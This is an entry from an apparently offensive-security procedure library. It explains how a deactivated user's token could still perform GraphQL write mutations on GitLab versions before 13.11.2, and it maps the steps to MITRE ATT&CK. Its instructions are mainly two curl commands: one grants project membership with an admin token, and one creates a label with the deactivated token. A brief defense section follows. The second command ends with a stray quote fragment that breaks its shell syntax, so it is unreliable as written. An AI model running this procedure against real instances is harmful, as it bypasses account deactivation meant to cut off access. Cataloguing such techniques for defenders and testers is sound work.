---
tags:
  - mutation
  - write-access
  - pre-13.11.2
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-add-user-to-project]]'
  - '[[commands/curl-graphql-labelcreate-mutation]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:25:59.518Z'
sub_techniques: []
id: 75489bc0-b037-4108-abbc-4cc8bc4764f8
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
---
# Perform-GraphQL-Mutation-with-Deactivated-Token

## Summary

This procedure demonstrates write access via GraphQL mutations for deactivated users in GitLab versions prior to 13.11.2, by adding the user to a project and creating a label.

## Description

Pre-13.11.2, GraphQL mutations succeed if the user has project access, bypassing deactivation. Post-update, reads still work but mutations are blocked. Use admin to grant project access first.

## Requirements

1. GitLab <13.11.2
2. Admin token and deactivated token
3. Existing project ID

## Defense

Defensive measures and detection strategies:

- Upgrade to 13.11.2+ to block mutations
- Audit project memberships for deactivated users
- Log GraphQL mutations

## Objectives

1. Grant project access to deactivated user
2. Execute mutation to create resource
3. Verify unauthorized write capability

## Instructions

### Step 1: Add User to Project

**Context**: Use admin token to enable project-specific access.

**Command** ([[commands/curl-add-user-to-project]]):
```bash
curl --header "Authorization: Bearer <<ADMIN TOKEN>>" "https://gitlab.domain.com/api/v4/projects/<PROJECT_ID>/members" --data "user_id=2&access_level=40"
```

> Adds user with developer access (40).

### Step 2: Execute Mutation

**Context**: Create a label in the project using deactivated token.

**Command** ([[commands/curl-graphql-labelcreate-mutation]]):
```bash
curl 'https://gitlab.domain.com/api/graphql' -H 'Content-Type: application/json' -H 'Accept: application/json' -H 'Authorization: Bearer <<DEACTIVATEDTOKEN>>' --data '{"query":"mutation {\n labelCreate(input:{title:\"deactivated\", projectPath:\"test1/test1\"}){\n errors\n label{\n id\n }\n }\n}"}'}'
```

> Creates label if successful, returns ID.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/curl-add-user-to-project]]
- [[commands/curl-graphql-labelcreate-mutation]]

## Tools Used

- [[tools/curl]]

## Tags

- mutation
- label-creation
- project-access
